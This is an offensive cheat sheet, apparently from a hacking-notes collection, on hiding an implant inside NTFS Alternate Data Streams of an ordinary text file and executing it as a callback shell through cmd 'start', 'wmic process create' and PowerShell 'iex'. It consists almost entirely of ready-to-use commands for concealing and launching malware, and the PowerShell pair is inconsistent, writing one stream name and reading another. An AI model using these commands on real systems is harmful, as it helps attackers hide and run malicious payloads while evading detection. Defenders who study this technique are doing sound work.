# Living off the Land

## 01 - Command Prompt

### 1.1 - Basics

Hide the file by appending inside an existing file.

```
C:\> type implant.exe > file.txt:implant.exe
```

Execute it

```
C:\> start file.txt:implant.exe
```

### 1.2 - WMIC

- Execute Callback Shell via ADS

```
C:\> wmic process create "c:\path\to\file.txt:implant.exe"
```

## 02 - Powershell

### 2.1 - Basics

Hide the file by appending inside an existing file.

```
PS C:\> Set-Content file.txt -Stream script.ps1 -Value implant.ps1
```

Execute Callback Shell via ADS

```
PS C:\> Get-Content file.txt -Stream implant.ps1 | iex
```

---
## References

- [r00t-3xp10it: ADS](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md)